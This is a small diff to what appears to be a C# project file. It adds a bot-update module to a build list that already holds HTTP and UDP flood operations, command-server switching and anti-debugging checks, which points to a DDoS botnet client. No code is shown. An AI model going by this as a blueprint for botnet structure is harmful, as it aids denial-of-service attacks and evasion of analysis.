@@ -67,6 +67,7 @@
     <Compile Include="Operations\HTTPFloodOP.cs" />
     <Compile Include="Operations\SwitchMasterOP.cs" />
     <Compile Include="Operations\UDPFloodOP.cs" />
+    <Compile Include="Operations\UpdateBotOP.cs" />
     <Compile Include="Util\AntiCheck\Anti\AntiFound.cs" />
     <Compile Include="Util\AntiCheck\Anti\CheckDebugger.cs" />
     <Compile Include="Util\AntiCheck\Anti\CheckProcess.cs" />
